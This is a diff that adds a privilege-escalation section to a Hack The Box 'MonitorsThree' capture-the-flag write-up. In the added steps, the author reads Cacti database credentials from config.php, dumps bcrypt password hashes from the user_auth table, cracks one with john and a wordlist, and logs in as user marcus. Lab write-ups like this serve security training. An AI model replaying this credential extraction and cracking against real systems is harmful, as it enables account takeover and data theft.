@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: subdomainenumeration cacti mysql sqli sqlinjection error-based rce remotecodeexecution
+tags: subdomainenumeration cacti mysql sqli sqlinjection error-based rce remotecodeexecution crackstation cracking blowfishbcrypt
 ---
 
 <br />
@@ -546,5 +546,301 @@ Once we access the uploaded PHP file, we successfully receive a bash reverse she
 <br />
 
 # Privilege Escalation: www-data -> marcus
+
+<br />
+
+Inside the system, we start enumerating the `/var/www/html/cacti` path.
+
+There are a lot of files, but inside `include path` we found one called `"config.php"` with useful data:
+
+<br />
+
+```php
+#$rdatabase_type     = 'mysql';
+#$rdatabase_default  = 'cacti';
+#$rdatabase_hostname = 'localhost';
+#$rdatabase_username = 'cactiuser';
+#$rdatabase_password = 'cactiuser';
+#$rdatabase_port     = '3306';
+#$rdatabase_retries  = 5;
+#$rdatabase_ssl      = false;
+#$rdatabase_ssl_key  = '';
+#$rdatabase_ssl_cert = '';
+#$rdatabase_ssl_ca   = '';
+```
+
+<br />
+
+These `credentials` allow us to log into the Cacti database:
+
+<br />
+
+```bash
+www-data@monitorsthree:~/html/cacti/include$ mysql -u cactiuser -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 8163
+Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]>
+```
+
+<br />
+
+First, we list the databases:
+
+<br />
+
+```bash
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| cacti              |
+| information_schema |
+| mysql              |
++--------------------+
+3 rows in set (0.001 sec)
+```
+
+<br />
+
+We select cacti and list the available tables:
+
+<br />
+
+```bash
+MariaDB [cacti]> show tables;
++-------------------------------------+
+| Tables_in_cacti                     |
++-------------------------------------+
+| aggregate_graph_templates           |
+| aggregate_graph_templates_graph     |
+| aggregate_graph_templates_item      |
+| aggregate_graphs                    |
+| aggregate_graphs_graph_item         |
+| aggregate_graphs_items              |
+| automation_devices                  |
+| automation_graph_rule_items         |
+| automation_graph_rules              |
+| automation_ips                      |
+| automation_match_rule_items         |
+| automation_networks                 |
+| automation_processes                |
+| automation_snmp                     |
+| automation_snmp_items               |
+| automation_templates                |
+| automation_tree_rule_items          |
+| automation_tree_rules               |
+| cdef                                |
+| cdef_items                          |
+| color_template_items                |
+| color_templates                     |
+| colors                              |
+| data_debug                          |
+| data_input                          |
+| data_input_data                     |
+| data_input_fields                   |
+| data_local                          |
+| data_source_profiles                |
+| data_source_profiles_cf             |
+| data_source_profiles_rra            |
+| data_source_purge_action            |
+| data_source_purge_temp              |
+| data_source_stats_daily             |
+| data_source_stats_hourly            |
+| data_source_stats_hourly_cache      |
+| data_source_stats_hourly_last       |
+| data_source_stats_monthly           |
+| data_source_stats_weekly            |
+| data_source_stats_yearly            |
+| data_template                       |
+| data_template_data                  |
+| data_template_rrd                   |
+| external_links                      |
+| graph_local                         |
+| graph_template_input                |
+| graph_template_input_defs           |
+| graph_templates                     |
+| graph_templates_gprint              |
+| graph_templates_graph               |
+| graph_templates_item                |
+| graph_tree                          |
+| graph_tree_items                    |
+| host                                |
+| host_graph                          |
+| host_snmp_cache                     |
+| host_snmp_query                     |
+| host_template                       |
+| host_template_graph                 |
+| host_template_snmp_query            |
+| plugin_config                       |
+| plugin_db_changes                   |
+| plugin_hooks                        |
+| plugin_realms                       |
+| poller                              |
+| poller_command                      |
+| poller_data_template_field_mappings |
+| poller_item                         |
+| poller_output                       |
+| poller_output_boost                 |
+| poller_output_boost_local_data_ids  |
+| poller_output_boost_processes       |
+| poller_output_realtime              |
+| poller_reindex                      |
+| poller_resource_cache               |
+| poller_time                         |
+| processes                           |
+| reports                             |
+| reports_items                       |
+| rrdcheck                            |
+| sessions                            |
+| settings                            |
+| settings_tree                       |
+| settings_user                       |
+| settings_user_group                 |
+| sites                               |
+| snmp_query                          |
+| snmp_query_graph                    |
+| snmp_query_graph_rrd                |
+| snmp_query_graph_rrd_sv             |
+| snmp_query_graph_sv                 |
+| snmpagent_cache                     |
+| snmpagent_cache_notifications       |
+| snmpagent_cache_textual_conventions |
+| snmpagent_managers                  |
+| snmpagent_managers_notifications    |
+| snmpagent_mibs                      |
+| snmpagent_notifications_log         |
+| user_auth                           |
+| user_auth_cache                     |
+| user_auth_group                     |
+| user_auth_group_members             |
+| user_auth_group_perms               |
+| user_auth_group_realm               |
+| user_auth_perms                     |
+| user_auth_realm                     |
+| user_auth_row_cache                 |
+| user_domains                        |
+| user_domains_ldap                   |
+| user_log                            |
+| vdef                                |
+| vdef_items                          |
+| version                             |
++-------------------------------------+
+113 rows in set (0.001 sec)
+```
+
+<br />
+
+If we describe the `"user_auth"` table, its content looks very interesting:
+
+<br />
+
+```bash
+MariaDB [cacti]> describe user_auth;
++------------------------+-----------------------+------+-----+---------+----------------+
+| Field                  | Type                  | Null | Key | Default | Extra          |
++------------------------+-----------------------+------+-----+---------+----------------+
+| id                     | mediumint(8) unsigned | NO   | PRI | NULL    | auto_increment |
+| username               | varchar(50)           | NO   | MUL | 0       |                |
+| password               | varchar(256)          | NO   |     |         |                |
+| realm                  | mediumint(8)          | NO   | MUL | 0       |                |
+| full_name              | varchar(100)          | YES  |     | 0       |                |
+| email_address          | varchar(128)          | YES  |     | NULL    |                |
+| must_change_password   | char(2)               | YES  |     | NULL    |                |
+| password_change        | char(2)               | YES  |     | on      |                |
+| show_tree              | char(2)               | YES  |     | on      |                |
+| show_list              | char(2)               | YES  |     | on      |                |
+| show_preview           | char(2)               | NO   |     | on      |                |
+| graph_settings         | char(2)               | YES  |     | NULL    |                |
+| login_opts             | tinyint(3) unsigned   | NO   |     | 1       |                |
+| policy_graphs          | tinyint(3) unsigned   | NO   |     | 1       |                |
+| policy_trees           | tinyint(3) unsigned   | NO   |     | 1       |                |
+| policy_hosts           | tinyint(3) unsigned   | NO   |     | 1       |                |
+| policy_graph_templates | tinyint(3) unsigned   | NO   |     | 1       |                |
+| enabled                | char(2)               | NO   | MUL | on      |                |
+| lastchange             | int(11)               | NO   |     | -1      |                |
+| lastlogin              | int(11)               | NO   |     | -1      |                |
+| password_history       | varchar(4096)         | NO   |     | -1      |                |
+| locked                 | varchar(3)            | NO   |     |         |                |
+| failed_attempts        | int(5)                | NO   |     | 0       |                |
+| lastfail               | int(10) unsigned      | NO   |     | 0       |                |
+| reset_perms            | int(10) unsigned      | NO   |     | 0       |                |
++------------------------+-----------------------+------+-----+---------+----------------+
+25 rows in set (0.001 sec)
+```
+
+<br />
+
+Finally, we extract the `username` and `password` fields from this table:
+
+<br />
+
+```bash
+MariaDB [cacti]> select username, password from user_auth;
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |
+| guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |
+| marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |
++----------+--------------------------------------------------------------+
+3 rows in set (0.000 sec)
+```
+
+<br />
+
+There are several `Blowfish Bcrypt` hashes.
+
+If we save them into a file, we can crack the `marcus` hash and obtain the following password:
+
+<br />
+
+```bash
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+12345678910      (?)     
+1g 0:00:00:03 DONE (2025-04-26 23:35) 0.2659g/s 134.0p/s 134.0c/s 134.0C/s nicole1..linkinpark
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+<br />
+
+In the system there is a user called `marcus`:
+
+<br />
+
+```bash
+www-data@monitorsthree:~/html/cacti/include$ cat /etc/passwd | grep marcus
+marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
+```
+
+<br />
+
+Using marcus `password`, we can log into this user and get the `user.txt` flag:
+
+<br />
+
+```bash
+www-data@monitorsthree:/home$ su marcus
+Password: 
+marcus@monitorsthree:/home$ cd
+marcus@monitorsthree:~$ cat user.txt
+dc84ded82dd15067371b6fc638xxxxxx
+```
+
+<br />
+
+# Privilege Escalation: marcus -> root
 
 <br />
